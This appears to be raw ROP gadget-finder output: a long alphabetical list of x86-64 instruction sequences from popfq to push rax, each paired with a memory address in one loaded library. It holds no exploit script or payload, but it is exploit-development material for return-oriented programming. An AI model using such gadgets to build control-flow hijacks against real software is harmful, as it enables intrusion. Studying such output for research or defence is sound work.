0x00002aaaaabbd4d5 : popfq ; ret
0x00002aaaaac1ce30 : popfq ; sbb eax, dword ptr [rax] ; add byte ptr [rax - 0x7d], cl ; ret 0x4910
0x00002aaaaab2f7b3 : popfq ; sub bh, 0xff ; dec dword ptr [rcx + 0x39] ; ret
0x00002aaaaac2f752 : psllq mm1, qword ptr [r15] ; jg 0x15a76d ; ret
0x00002aaaaac32222 : psllq mm1, qword ptr [r15] ; jg 0x15d23d ; ret
0x00002aaaaac34d42 : psllq mm1, qword ptr [r15] ; jg 0x15fd5d ; ret
0x00002aaaaac2f753 : psllq mm1, qword ptr [rdi] ; jg 0x15a76c ; ret
0x00002aaaaac32223 : psllq mm1, qword ptr [rdi] ; jg 0x15d23c ; ret
0x00002aaaaac34d43 : psllq mm1, qword ptr [rdi] ; jg 0x15fd5c ; ret
0x00002aaaaab7a2b6 : psllq mm1, qword ptr [rdi] ; jg 0xa52ca ; mov dword ptr [rdi + 0xf], ecx ; ret
0x00002aaaaab7a2b5 : psllq mm1, qword ptr [rdi] ; jg 0xa52cb ; mov dword ptr [rdi + 0xf], ecx ; ret
0x00002aaaaab7a317 : psllq mm1, qword ptr [rdi] ; jg 0xa532c ; mov qword ptr [rdi + 0xf], rcx ; ret
0x00002aaaaab7a316 : psllq mm1, qword ptr [rdi] ; jg 0xa532d ; mov qword ptr [rdi + 0xf], rcx ; ret
0x00002aaaaab7a418 : psllq mm1, qword ptr [rdi] ; jg 0xa542e ; movdqu xmmword ptr [rdi + 0xf], xmm2 ; ret
0x00002aaaaab7af86 : psllq mm1, qword ptr [rdi] ; jg 0xa5f9a ; mov dword ptr [rdi + 0xf], ecx ; ret
0x00002aaaaab7af85 : psllq mm1, qword ptr [rdi] ; jg 0xa5f9b ; mov dword ptr [rdi + 0xf], ecx ; ret
0x00002aaaaab7afe7 : psllq mm1, qword ptr [rdi] ; jg 0xa5ffc ; mov qword ptr [rdi + 0xf], rcx ; ret
0x00002aaaaab7afe6 : psllq mm1, qword ptr [rdi] ; jg 0xa5ffd ; mov qword ptr [rdi + 0xf], rcx ; ret
0x00002aaaaab7b0e8 : psllq mm1, qword ptr [rdi] ; jg 0xa60fe ; movdqu xmmword ptr [rdi + 0xf], xmm2 ; ret
0x00002aaaaab7d396 : psllq mm1, qword ptr [rdi] ; jg 0xa83aa ; mov dword ptr [rdi + 0xf], ecx ; ret
0x00002aaaaab7d395 : psllq mm1, qword ptr [rdi] ; jg 0xa83ab ; mov dword ptr [rdi + 0xf], ecx ; ret
0x00002aaaaab7d3f7 : psllq mm1, qword ptr [rdi] ; jg 0xa840c ; mov qword ptr [rdi + 0xf], rcx ; ret
0x00002aaaaab7d3f6 : psllq mm1, qword ptr [rdi] ; jg 0xa840d ; mov qword ptr [rdi + 0xf], rcx ; ret
0x00002aaaaab7d4f8 : psllq mm1, qword ptr [rdi] ; jg 0xa850e ; movdqu xmmword ptr [rdi + 0xf], xmm2 ; ret
0x00002aaaaab7de66 : psllq mm1, qword ptr [rdi] ; jg 0xa8e7a ; mov dword ptr [rdi + 0xf], ecx ; ret
0x00002aaaaab7de65 : psllq mm1, qword ptr [rdi] ; jg 0xa8e7b ; mov dword ptr [rdi + 0xf], ecx ; ret
0x00002aaaaab7dec7 : psllq mm1, qword ptr [rdi] ; jg 0xa8edc ; mov qword ptr [rdi + 0xf], rcx ; ret
0x00002aaaaab7dec6 : psllq mm1, qword ptr [rdi] ; jg 0xa8edd ; mov qword ptr [rdi + 0xf], rcx ; ret
0x00002aaaaab7dfc8 : psllq mm1, qword ptr [rdi] ; jg 0xa8fde ; movdqu xmmword ptr [rdi + 0xf], xmm2 ; ret
0x00002aaaaab9366c : psubb mm1, qword ptr [rax - 0x77] ; ret
0x00002aaaaab20aa9 : push -0x17000005 ; sahf ; xor al, 2 ; add byte ptr [rax + 0x39], cl ; ret
0x00002aaaaac6eaa9 : push -0x1a7b0008 ; add dword ptr [rax], eax ; xor al, 0x69 ; clc ; call rsp
0x00002aaaaac6c0e9 : push -0x1e630012 ; add byte ptr [rax], al ; push 0xee ; jmp rsp
0x00002aaaaabdf33b : push -0x48f00077 ; add al, 0x78 ; and eax, 1 ; ret
0x00002aaaaaad7c01 : push -0x7329150 ; ret
0x00002aaaaabca1d4 : push -0x76000003 ; ret 0xcb8
0x00002aaaaab2015c : push -0x76000005 ; ret 0x8941
0x00002aaaaab31896 : push -0x7c000006 ; ret 0x8908
0x00002aaaaac41014 : push -0x7ffffffa ; cmp byte ptr [rcx], al ; sbb rax, -1 ; ret
0x00002aaaaac44d84 : push -0x9ffffff ; ret 0x7501
0x00002aaaaaaf557f : push -0xcfffff7 ; ret
0x00002aaaaab809b7 : push -0xfb872b8 ; ret
0x00002aaaaab8156b : push 0 ; lea rcx, qword ptr [rax + 4] ; lea r9, qword ptr [rsp + 0x20] ; call rbx
0x00002aaaaac008ba : push 0 ; push 0x19 ; call qword ptr [rax]
0x00002aaaaab1af8f : push 0x11b8 ; add byte ptr [rcx - 0x75], cl ; ret
0x00002aaaaab1b65e : push 0x13b8 ; add byte ptr [rcx - 0x75], cl ; ret
0x00002aaaaac008bc : push 0x19 ; call qword ptr [rax]
0x00002aaaaac093e6 : push 0x1f0fe1ff ; add byte ptr [rax], 0 ; add byte ptr [rax], al ; ret
0x00002aaaaabce7e8 : push 0x244c8903 ; xor byte ptr [rdi], cl ; xchg eax, esp ; ret 0x8445
0x00002aaaaabb54dc : push 0x2494b60f ; ret
0x00002aaaaab2b33c : push 0x39fffffb ; fmul dword ptr [rdi] ; ret
0x00002aaaaac8e73a : push 0x41380e0a ; ret
0x00002aaaaac6d405 : push 0x44940001 ; cmc ; jmp rsp
0x00002aaaaabe91c2 : push 0x45 ; sub eax, dword ptr [rax] ; test eax, eax ; jne 0x1141da ; xor eax, eax ; ret
0x00002aaaaab50f3c : push 0x489095eb ; mov eax, 0xffffffff ; ret
0x00002aaaaab5a0cc : push 0x48ee894c ; mov edi, ebx ; call rax
0x00002aaaaab583d5 : push 0x4c000008 ; cmp edx, eax ; jne 0x833aa ; ret
0x00002aaaaac187c2 : push 0x4f ; sub byte ptr [rax], al ; test eax, eax ; jne 0x1437da ; xor eax, eax ; ret
0x00002aaaaac5be04 : push 0x58ffefd9 ; fucomp st(7) ; lcall ptr [rbx + rbx*8] ; out dx, eax ; jmp rsi
0x00002aaaaab80cd2 : push 0x5a ; or al, 0 ; ret
0x00002aaaaabffcd4 : push 0x5b0029d0 ; ret
0x00002aaaaac0a7b8 : push 0x5ba0005 ; add byte ptr [rax], al ; add byte ptr [rax - 0x77], cl ; ret
0x00002aaaaaafc992 : push 0x5c415d5b ; pop r13 ; pop r14 ; pop r15 ; ret
0x00002aaaaabbce93 : push 0x5c415d5b ; pop r13 ; ret
0x00002aaaaac42a9a : push 0x63490002 ; or al, 0x93 ; add rcx, r11 ; jmp rcx
0x00002aaaaac33c87 : push 0x63490003 ; adc al, 0x93 ; lea rdx, qword ptr [r11 + rdx] ; jmp rdx
0x00002aaaaac5acb9 : push 0x65f7ffed ; in eax, dx ; call rdx
0x00002aaaaac5aca5 : push 0x68caffed ; in eax, dx ; jmp qword ptr [rdx]
0x00002aaaaac59c82 : push 0x6e ; ja 0x184c0d ; ret 0x48f
0x00002aaaaac5d260 : push 0xd3 ; call qword ptr [rcx]
0x00002aaaaac72009 : push 0xe9 ; jmp rax
0x00002aaaaac6c0f1 : push 0xee ; jmp rsp
0x00002aaaaac8be99 : push 0xf7 ; jmp rsi
0x00002aaaaab6b28b : push 0xff ; ja 0x96271 ; pop rbx ; pop rbp ; pop r12 ; ret
0x00002aaaaab02f43 : push 0xfff6348 ; mov bh, 4 ; js 0x2deda ; loopne 0x2df5a ; ret
0x00002aaaaab21982 : push 0xfffffb ; add byte ptr [rax], al ; add byte ptr [rax - 0x77], cl ; ret
0x00002aaaaac42969 : push 2 ; add byte ptr [rcx + 0x63], cl ; or al, 0x93 ; add rcx, r11 ; jmp rcx
0x00002aaaaac093de : push 2 ; add rdi, 0x68 ; jmp rcx
0x00002aaaaac33b07 : push 3 ; add byte ptr [rcx + 0x63], cl ; adc al, 0x93 ; lea rdx, qword ptr [r11 + rdx] ; jmp rdx
0x00002aaaaab7ad12 : push 5 ; add byte ptr [rax], al ; ret
0x00002aaaaab01dd2 : push 6 ; add byte ptr [rax - 0x77], cl ; ret
0x00002aaaaab254c1 : push qword ptr [r9] ; sal bh, cl ; int1 ; add eax, r8d ; ret
0x00002aaaaac69b17 : push qword ptr [rax + 0x13] ; cld ; inc eax ; adc al, 0xfc ; call qword ptr [rax]
0x00002aaaaac69b03 : push qword ptr [rax + 0x21] ; cld ; inc eax ; and bh, ah ; call qword ptr [rax]
0x00002aaaaac69b73 : push qword ptr [rax + 0x40fffc5e] ; pop rsi ; cld ; call rax
0x00002aaaaac6a05f : push qword ptr [rax + 0x40fffc86] ; xchg ah, bh ; call rax
0x00002aaaaac6a76f : push qword ptr [rax + 0x40fffcaa] ; stosb byte ptr [rdi], al ; cld ; call rax
0x00002aaaaac6a557 : push qword ptr [rax + 0x40fffcad] ; lodsd eax, dword ptr [rsi] ; cld ; call rax
0x00002aaaaac69d8b : push qword ptr [rax + 0x50fffc5b] ; push rcx ; cld ; call qword ptr [rax]
0x00002aaaaac69327 : push qword ptr [rax + 0x64] ; sti ; inc eax ; sti ; call qword ptr [rax]
0x00002aaaaac5cb93 : push qword ptr [rax + 0x6dfff381] ; jl 0x187b96 ; jmp rdx
0x00002aaaaac5cb92 : push qword ptr [rax + 0x6dfff381] ; jl 0x187b97 ; jmp rdx
0x00002aaaaac5c403 : push qword ptr [rax + 1] ; jmp qword ptr [rax - 0x2f000dff]
0x00002aaaaac6921b : push qword ptr [rax + 2] ; sti ; inc dword ptr [rax + 3] ; sti ; call qword ptr [rax]
0x00002aaaaac6ee3b : push qword ptr [rax + rax + 0x3bf40002] ; stc ; jmp rsp
0x00002aaaaac6a403 : push qword ptr [rax + rdi*2 - 4] ; jmp rsp
0x00002aaaaac5c217 : push qword ptr [rax - 0x15] ; int1 ; jmp qword ptr [rax - 0x2f000e15]
0x00002aaaaac5f4b7 : push qword ptr [rax - 0x1f0005d8] ; sub dl, bh ; call rax
0x00002aaaaac5d983 : push qword ptr [rax - 0x1f000bad] ; push rdx ; hlt ; jmp rax
0x00002aaaaac5c3f3 : push qword ptr [rax - 0x1f000e00] ; add dl, dh ; call qword ptr [rax]
0x00002aaaaac5c41b : push qword ptr [rax - 0x2f000dff] ; add edx, esi ; jmp rax
0x00002aaaaac697bf : push qword ptr [rax - 0x30] ; sti ; inc eax ; sar ebx, 1 ; call qword ptr [rax]
0x00002aaaaac5c2cb : push qword ptr [rax - 0x3f000e12] ; out dx, al ; int1 ; call rax
0x00002aaaaac5c257 : push qword ptr [rax - 0x3f000e14] ; in al, dx ; int1 ; call rax
0x00002aaaaac5c007 : push qword ptr [rax - 0x3f000e92] ; outsb dx, byte ptr [rsi] ; int1 ; call rax
0x00002aaaaac6a7bf : push qword ptr [rax - 0x61] ; cld ; jmp rax
0x00002aaaaac6a9c3 : push qword ptr [rax - 0x62] ; cld ; jmp rax
0x00002aaaaab35dbb : push qword ptr [rax - 0x77] ; ret
0x00002aaaaac69937 : push qword ptr [rax - 0xb] ; sti ; inc eax ; idiv bl ; call qword ptr [rax]
0x00002aaaaac6998b : push qword ptr [rax - 4] ; sti ; dec dword ptr [rax + 0x28] ; cld ; call qword ptr [rax]
0x00002aaaaac697ef : push qword ptr [rax] ; add ah, bh ; push rax ; add esp, edi ; call rax
0x00002aaaaac69877 : push qword ptr [rax] ; add edi, esp ; call qword ptr [rax]
0x00002aaaaac6971b : push qword ptr [rax] ; fdiv st(3), st(0) ; jmp qword ptr [rax]
0x00002aaaaac6a4cb : push qword ptr [rax] ; ja 0x1954cf ; call rax
0x00002aaaaac6a2c7 : push qword ptr [rax] ; js 0x1952cf ; jmp qword ptr [rax + 0x16fffc77]
0x00002aaaaab79b1f : push qword ptr [rax] ; leave ; mov byte ptr [rax], cl ; mov rax, rdi ; ret
0x00002aaaaac695cf : push qword ptr [rax] ; mov bh, 0xfd ; call rcx
0x00002aaaaac6978f : push qword ptr [rax] ; mov edi, 0xc200fffb ; sti ; call qword ptr [rax - 0x3d]
0x00002aaaaac69f57 : push qword ptr [rax] ; pop rax ; cld ; jmp qword ptr [rax + 0x20fffc57]
0x00002aaaaac692ef : push qword ptr [rax] ; sti ; call qword ptr [rax]
0x00002aaaaac46708 : push qword ptr [rbp + 0x1a] ; xor eax, eax ; ret
0x00002aaaaac5d7ef : push qword ptr [rbp + 0x22fff452] ; push rax ; hlt ; jmp qword ptr [rdx]
0x00002aaaaab4969b : push qword ptr [rbp + 2] ; pop rbx ; ret
0x00002aaaaab50a4d : push qword ptr [rbp + rax - 0xa] ; ret 0x7401
0x00002aaaaab47b65 : push qword ptr [rbp + rax - 0xa] ; ret 0x7408
0x00002aaaaac16db0 : push qword ptr [rbp + rcx + 0x48] ; add esp, 8 ; ret
0x00002aaaaac0865e : push qword ptr [rbp + rcx - 0x18] ; ret 0xffee
0x00002aaaaab47b0d : push qword ptr [rbp + rdi*4 - 0xa] ; ret 0x7508
0x00002aaaaab9cdfe : push qword ptr [rbp + rsi - 0x77] ; ret 0xe283
0x00002aaaaab1db7e : push qword ptr [rbp - 0x11] ; mov rax, rdx ; ret
0x00002aaaaabf4192 : push qword ptr [rbp - 0x15] ; pop rbx ; ret
0x00002aaaaabfcbcb : push qword ptr [rbp - 0x16] ; add rsp, 8 ; pop rbx ; pop rbp ; ret
0x00002aaaaac4868c : push qword ptr [rbp - 0x16] ; pop rbx ; ret
0x00002aaaaab1d4c6 : push qword ptr [rbp - 0x19] ; mov rax, rdx ; ret
0x00002aaaaab50fd1 : push qword ptr [rbp - 0x1a] ; pop rbx ; ret
0x00002aaaaabe9f82 : push qword ptr [rbp - 0xe] ; xor eax, eax ; leave ; ret
0x00002aaaaaba06e5 : push qword ptr [rbx + 0x31] ; ret
0x00002aaaaabc9e98 : push qword ptr [rbx + 0x34] ; ret
0x00002aaaaab0a76c : push qword ptr [rbx + 1] ; ret
0x00002aaaaab1cb26 : push qword ptr [rbx + 3] ; xor eax, eax ; ret
0x00002aaaaab47cbc : push qword ptr [rbx + rax - 0x7d] ; and ebp, edi ; pop rbx ; ret
0x00002aaaaac69ccf : push qword ptr [rbx + rbx*2 - 4] ; jmp rsp
0x00002aaaaab48cde : push qword ptr [rbx + rcx - 0x18] ; ret 0xfabb
0x00002aaaaac6d2d3 : push qword ptr [rcx + 0x14940001] ; cmc ; call rsp
0x00002aaaaac5b973 : push qword ptr [rcx + rbx*2 - 0x12] ; lcall ptr [rcx + rbx*2 - 0x12] ; jmp qword ptr [rsi]
0x00002aaaaac6bcf3 : push qword ptr [rcx + rcx*8 - 0x3ec0000] ; in eax, dx ; call rsp
0x00002aaaaac6f473 : push qword ptr [rcx + rsi + 2] ; add byte ptr [rcx + rbx - 6], dh ; jmp rsp
0x00002aaaaac6b9c3 : push qword ptr [rcx + rsi*4 - 0x739c0000] ; in eax, dx ; jmp rsp
0x00002aaaaac6952f : push qword ptr [rcx - 0x4a] ; std ; call rcx
0x00002aaaaab49b81 : push qword ptr [rcx] ; rcr byte ptr [rbx + 0x5d], 0x41 ; pop rsp ; ret
0x00002aaaaaba37db : push qword ptr [rcx] ; ror byte ptr [rax - 0x75], 0x54 ; ret
0x00002aaaaab4af78 : push qword ptr [rcx] ; ror byte ptr [rax - 0x7d], cl ; clc ; dec dword ptr [rdi] ; xchg eax, esp ; ret 0xdaf7
0x00002aaaaab254c2 : push qword ptr [rcx] ; sal bh, cl ; int1 ; add eax, r8d ; ret
0x00002aaaaab1ca2c : push qword ptr [rcx] ; shr bl, cl ; stosb byte ptr [rdi], al ; mov eax, 0xffffffff ; ret
0x00002aaaaab8c065 : push qword ptr [rcx] ; test byte ptr [rbp - 0x73], 0x2c ; mov ah, 0xe9 ; ret
0x00002aaaaabe9cec : push qword ptr [rdi + 0x1b] ; ret
0x00002aaaaab0a42d : push qword ptr [rdi + 0x20] ; ret
0x00002aaaaabcba68 : push qword ptr [rdi + 0x35] ; ret
0x00002aaaaabcbb0c : push qword ptr [rdi + 0x41] ; add rsp, 0x60 ; pop rbx ; ret
0x00002aaaaabcfbd2 : push qword ptr [rdi + 0x73] ; add rsp, 0x20 ; pop rbx ; pop rbp ; pop r12 ; ret
0x00002aaaaac5627f : push qword ptr [rdi + 0x7bffeb21] ; and ch, bl ; call rdx
0x00002aaaaabd0bb3 : push qword ptr [rdi + 0xa] ; ret
0x00002aaaaabcb102 : push qword ptr [rdi + 0xb] ; ret
0x00002aaaaab0a7a1 : push qword ptr [rdi + 0xc] ; ret
0x00002aaaaabfce5e : push qword ptr [rdi + 0xf] ; sub rsp, -0x80 ; pop rbx ; pop rbp ; pop r12 ; ret
0x00002aaaaaba19dc : push qword ptr [rdi + 1] ; ret
0x00002aaaaab0a7eb : push qword ptr [rdi + 2] ; ret
0x00002aaaaabcb00a : push qword ptr [rdi + 3] ; ret
0x00002aaaaabcb059 : push qword ptr [rdi + 4] ; ret
0x00002aaaaaba05c0 : push qword ptr [rdi + 5] ; ret
0x00002aaaaaba04cf : push qword ptr [rdi + 6] ; ret
0x00002aaaaab9daa6 : push qword ptr [rdi + 7] ; ret
0x00002aaaaab0a735 : push qword ptr [rdi + 8] ; ret
0x00002aaaaab9c82c : push qword ptr [rdi + 9] ; pop rbx ; ret
0x00002aaaaab9088c : push qword ptr [rdi + 9] ; ret
0x00002aaaaab50596 : push qword ptr [rdi + rax + 0x5b] ; pop rbp ; pop r12 ; ret
0x00002aaaaabbc916 : push qword ptr [rdi + rax - 0x48] ; add al, byte ptr [rax] ; add byte ptr [rax], al ; ret
0x00002aaaaac6a1d3 : push qword ptr [rdi + rax*4 - 0x78bb0004] ; cld ; call rsp
0x00002aaaaac5cb13 : push qword ptr [rdi + rax*4 - 0xd] ; jmp rdx
0x00002aaaaac08c46 : push qword ptr [rdi + rbp*4 - 0x18] ; ret 0x3a
0x00002aaaaac69ce7 : push qword ptr [rdi + rbx*2 + 0x5f44fffc] ; cld ; call rsp
0x00002aaaaac6c3ab : push qword ptr [rdi + rsi*8 + 0x1f940000] ; out dx, eax ; jmp rsp
0x00002aaaaab6b28c : push qword ptr [rdi - 0x27] ; pop rbx ; pop rbp ; pop r12 ; ret
0x00002aaaaabe9cc4 : push qword ptr [rdi - 0x33] ; add rsp, 8 ; pop rbx ; pop rbp ; ret
0x00002aaaaac6a643 : push qword ptr [rdx + 0x42fffca8] ; test al, 0xfc ; call rdx
0x00002aaaaac6e4d3 : push qword ptr [rdx + rax*8] ; add dword ptr [rax], eax ; xor al, 0xe3 ; idiv edi ; ret 1
0x00002aaaaac6ef0b : push qword ptr [rdx + rcx + 0x52240002] ; stc ; call rsp
0x00002aaaaac6ce1b : push qword ptr [rdx + rdi + 0x24540001] ; jmp rsp
0x00002aaaaab816fb : push qword ptr [rdx + rdx*2 - 0x7b] ; ror byte ptr [rdi], 0x95 ; ret 0xe883
0x00002aaaaac5d487 : push qword ptr [rdx - 0x24] ; call qword ptr [rcx]
0x00002aaaaac6a317 : push qword ptr [rdx] ; jle 0x19531f ; jmp qword ptr [rdx + 0x22fffc7d]
0x00002aaaaabcfe6a : push qword ptr [rsi + 0x13] ; cmp eax, 0xa1 ; je 0xfae93 ; neg eax ; pop rbx ; ret
0x00002aaaaac69bbb : push qword ptr [rsi + 0x46fffc5d] ; pop rbp ; cld ; call rsi
0x00002aaaaac6a0a7 : push qword ptr [rsi + 0x46fffc85] ; test edi, esp ; call rsi
0x00002aaaaac6a59f : push qword ptr [rsi + 0x46fffcac] ; lodsb al, byte ptr [rsi] ; cld ; call rsi
0x00002aaaaabdddc9 : push qword ptr [rsi + rax - 0x7d] ; rol byte ptr [rcx], 0x66 ; mov dword ptr [rdx], eax ; ret
0x00002aaaaac6c2ab : push qword ptr [rsi + rbp*8 - 0x260c0000] ; out dx, al ; call rsp
0x00002aaaaac693af : push qword ptr [rsi - 0x60] ; std ; jmp qword ptr [rdx]
0x00002aaaaac6a08f : push qword ptr [rsi - 0x7f] ; cld ; jmp rsi
0x00002aaaaac5d7e7 : push qword ptr [rsi] ; push rcx ; hlt ; jmp qword ptr [rdx]
0x00002aaaaac5d783 : push qword ptr [rsi] ; push rdx ; hlt ; inc dword ptr [rax + 0x52] ; hlt ; jmp qword ptr [rdx]
0x00002aaaaac6ea83 : push qword ptr [rsp + 0x65640001] ; clc ; jmp rsp
0x00002aaaaabcaf05 : push qword ptr [rsp + rax - 0x75] ; and al, 0xc ; add rsp, 0x18 ; ret
0x00002aaaaac6b91b : push qword ptr [rsp + rbp*4 + 0x77040000] ; in eax, dx ; jmp rsp
0x00002aaaaac6bb23 : push qword ptr [rsp + rdi*4 - 0x446c0000] ; in eax, dx ; call rsp
0x00002aaaaac5d69c : push r11 ; hlt ; dec dword ptr [rdi + 0x53] ; hlt ; jmp qword ptr [rdx]
0x00002aaaaac5d6a0 : push r11 ; hlt ; jmp qword ptr [rdx]
0x00002aaaaac09476 : push r12 ; mov eax, 1 ; ret
0x00002aaaaac5d938 : push r13 ; hlt ; jmp qword ptr [rdx]
0x00002aaaaab5020c : push r8 ; add byte ptr [rax], al ; add byte ptr [rax], al ; pop rbx ; ret
0x00002aaaaac074df : push r8 ; mov eax, 1 ; pop rbx ; pop rbp ; pop r12 ; ret
0x00002aaaaab46c3a : push rax ; adc byte ptr [rax - 0x77], cl ; ret
0x00002aaaaab51891 : push rax ; adc byte ptr [rbx - 0x2fd6efb9], cl ; ret
0x00002aaaaac00b4d : push rax ; adc dh, dh ; ret 0x7401
0x00002aaaaab55c4d : push rax ; adc dh, dh ; ret 0xf0f
0x00002aaaaac6f92d : push rax ; add al, byte ptr [rax] ; je 0x19a8d8 ; cli ; call rsp
0x00002aaaaac443db : push rax ; add al, byte ptr [rax] ; movsxd rcx, dword ptr [r11 + rdx*4] ; add rcx, r11 ; jmp rcx
0x00002aaaaac69897 : push rax ; add bh, ah ; call rax
0x00002aaaaab5020d : push rax ; add byte ptr [rax], al ; add byte ptr [rax], al ; pop rbx ; ret
0x00002aaaaac74f95 : push rax ; add byte ptr [rax], al ; pop rax ; mov dh, 0xeb ; jmp qword ptr [rax]
0x00002aaaaac5c44b : push rax ; add dh, dl ; call qword ptr [rax]
0x00002aaaaac5c3ec : push rax ; add dl, dh ; inc dword ptr [rax - 0x4f000e00] ; add dl, dh ; jmp rax
0x00002aaaaab50427 : push rax ; add dword ptr [rax - 0x77], ecx ; push rbx ; or byte ptr [rdi], cl ; mov dh, 0 ; pop rbx ; ret
0x00002aaaaab4cf5c : push rax ; add dword ptr [rax - 0x77], ecx ; push rdi ; or byte ptr [rdi], cl ; mov dh, 0 ; ret
0x00002aaaaac85005 : push rax ; add dword ptr [rax], eax ; jno 0x1b0006 ; jmp qword ptr [rcx]
0x00002aaaaac84f75 : push rax ; add dword ptr [rax], eax ; mov byte ptr [rax - 0xb], dh ; jmp qword ptr [rcx]
0x00002aaaaac85035 : push rax ; add dword ptr [rax], eax ; test al, 0x71 ; cmc ; jmp qword ptr [rcx]
0x00002aaaaab02711 : push rax ; add dword ptr [rcx + rdi - 0x7d], esi ; ret
0x00002aaaaab20ccb : push rax ; add dword ptr [rcx - 0x77], ecx ; push rbp ; sub dh, al ; add byte ptr [rcx - 0x7d], cl ; ret
0x00002aaaaab69b9f : push rax ; add eax, ebp ; or dl, byte ptr [rcx - 0x76b70001] ; ret 0xc031
0x00002aaaaac698fb : push rax ; add edi, esp ; jmp rax
0x00002aaaaac5c427 : push rax ; add edx, esi ; call qword ptr [rax]
0x00002aaaaac697f3 : push rax ; add esp, edi ; call rax
0x00002aaaaac69874 : push rax ; add esp, edi ; push qword ptr [rax] ; add edi, esp ; call qword ptr [rax]
0x00002aaaaac10019 : push rax ; add rsp, 0x10 ; pop rbx ; ret
0x00002aaaaac0fc77 : push rax ; add rsp, 0x18 ; xor eax, eax ; pop rbx ; pop rbp ; ret
0x00002aaaaac15471 : push rax ; and byte ptr [rax - 0x77], cl ; ret 0x3d83
0x00002aaaaac025cb : push rax ; and byte ptr [rbx - 0x48], bl ; add dword ptr [rax], eax ; add byte ptr [rax], al ; pop rbp ; pop r12 ; ret
0x00002aaaaac86e50 : push rax ; and dh, dh ; jmp qword ptr [rsi]
0x00002aaaaaaf68e8 : push rax ; call rbx
0x00002aaaaac5c393 : push rax ; cld ; int1 ; call qword ptr [rax]
0x00002aaaaac87910 : push rax ; cmp al, 0xf6 ; call qword ptr [rax]
0x00002aaaaab20829 : push rax ; cmp byte ptr [rax + 0x39], cl ; ret
0x00002aaaaab2f7af : push rax ; cmp byte ptr [rbx + rcx*4 - 0x63], cl ; sub bh, 0xff ; dec dword ptr [rcx + 0x39] ; ret
0x00002aaaaac6a287 : push rax ; cmp esp, 0xfc8180ff ; jmp qword ptr [rax]
0x00002aaaaac69613 : push rax ; fsincos ; call rax
0x00002aaaaac5d749 : push rax ; hlt ; dec dword ptr [rcx] ; push rbp ; hlt ; call qword ptr [rbx]
0x00002aaaaac5d5d5 : push rax ; hlt ; inc dword ptr [rax + 0x51] ; hlt ; dec dword ptr [rdx + 0x51] ; hlt ; jmp qword ptr [rdx]
0x00002aaaaac5d935 : push rax ; hlt ; inc dword ptr [rbp + 0x55] ; hlt ; jmp qword ptr [rdx]
0x00002aaaaac5d5c1 : push rax ; hlt ; inc dword ptr [rdi] ; push rcx ; hlt ; call qword ptr [rcx]
0x00002aaaaac5d841 : push rax ; hlt ; jmp qword ptr [rcx + 0x22fff452]
0x00002aaaaac5d5d1 : push rax ; hlt ; jmp qword ptr [rdx]
0x00002aaaaac5d547 : push rax ; hlt ; jmp rax
0x00002aaaaac5d5f5 : push rax ; hlt ; lcall ptr [rcx + 0x22fff451] ; push rax ; hlt ; jmp qword ptr [rdx]
0x00002aaaaac5d801 : push rax ; hlt ; lcall ptr [rcx + 0x53] ; hlt ; jmp qword ptr [rdx]
0x00002aaaaac5d661 : push rax ; hlt ; ljmp ptr [rbx + 0x22fff452] ; push rax ; hlt ; jmp qword ptr [rdx]
0x00002aaaaac5d7ed : push rax ; hlt ; push qword ptr [rbp + 0x22fff452] ; push rax ; hlt ; jmp qword ptr [rdx]
0x00002aaaaac5d7e5 : push rax ; hlt ; push qword ptr [rsi] ; push rcx ; hlt ; jmp qword ptr [rdx]
0x00002aaaaac833b0 : push rax ; in al, dx ; hlt ; jmp qword ptr [rcx]
0x00002aaaaac5c267 : push rax ; in al, dx ; int1 ; inc dword ptr [rax] ; in eax, dx ; int1 ; call qword ptr [rax]
0x00002aaaaac6966c : push rax ; in eax, -5 ; jmp rax
0x00002aaaaac5c293 : push rax ; in eax, dx ; int1 ; call qword ptr [rax]
0x00002aaaaac49ca4 : push rax ; jb 0x174c95 ; call rax
0x00002aaaaac850b0 : push rax ; jb 0x1b00ab ; jmp qword ptr [rcx]
0x00002aaaaac6a2a0 : push rax ; jge 0x1952a2 ; call rax
0x00002aaaaac6a2a8 : push rax ; jl 0x1952aa ; call rax
0x00002aaaaac7ac30 : push rax ; jle 0x1a5c24 ; jmp qword ptr [rcx]
0x00002aaaaac6b6f9 : push rax ; jmp 0x1966fd
0x00002aaaaac6a2b0 : push rax ; jnp 0x1952b2 ; call rax
0x00002aaaaac70600 : push rax ; jnp 0x19b603 ; jmp qword ptr [rdx]
0x00002aaaaac6a2b8 : push rax ; jp 0x1952ba ; call rax
0x00002aaaaac6a4c4 : push rax ; js 0x1954ce ; inc eax ; ja 0x1954d2 ; push qword ptr [rax] ; ja 0x1954d6 ; call rax
0x00002aaaaac6a7bb : push rax ; lahf ; cld ; push qword ptr [rax - 0x61] ; cld ; jmp rax
0x00002aaaaab49fe2 : push rax ; lea r9, qword ptr [rsp + 0x10] ; mov rdi, r12 ; call rbx
0x00002aaaaac6a758 : push rax ; lodsd eax, dword ptr [rsi] ; cld ; jmp rax
0x00002aaaaab3410a : push rax ; loop 0x5f115 ; dec dword ptr [rcx + rcx*4 - 1] ; call 0x7b3a9
0x00002aaaaac6a9e8 : push rax ; mov ah, bh ; call rax
0x00002aaaaac6aa2c : push rax ; mov bh, ah ; call rax
0x00002aaaaac6a9f8 : push rax ; mov dr1, esp ; call rax
0x00002aaaaaaf8ace : push rax ; mov dword ptr [rax + 0x54], edx ; ret
0x00002aaaaac074e0 : push rax ; mov eax, 1 ; pop rbx ; pop rbp ; pop r12 ; ret
0x00002aaaaac69750 : push rax ; mov ebp, 0xc190fffb ; sti ; jmp rax
0x00002aaaaac6a9f0 : push rax ; mov edi, esp ; call rax
0x00002aaaaac09c66 : push rax ; mov qword ptr [rsi + 0x10], rax ; ret
0x00002aaaaabe7736 : push rax ; mov rsi, rdx ; call rax
0x00002aaaaac6aa3c : push rax ; nop ; cld ; call rax
0x00002aaaaab53b82 : push rax ; or byte ptr [rax - 0x75], cl ; adc byte ptr [rcx - 0x7d], al ; ret 0x4801
0x00002aaaaab565d2 : push rax ; or dh, dh ; ret 0x7404
0x00002aaaaab56545 : push rax ; or dh, dh ; ret 0xf04
0x00002aaaaaaf4e57 : push rax ; or dh, dh ; ret 0xf08
0x00002aaaaac194ec : push rax ; or dword ptr [rax], eax ; add byte ptr [rax - 0x7d], cl ; ret 0x4910
0x00002aaaaac5c2db : push rax ; out dx, al ; int1 ; inc dword ptr [rax] ; out dx, eax ; int1 ; call qword ptr [rax]
0x00002aaaaac84d50 : push rax ; outsb dx, byte ptr [rsi] ; cmc ; jmp qword ptr [rcx]
0x00002aaaaac68ab6 : push rax ; pop r9 ; clc ; ret 0x6e1f
0x00002aaaaac849f0 : push rax ; pop rbx ; cmc ; jmp qword ptr [rcx]
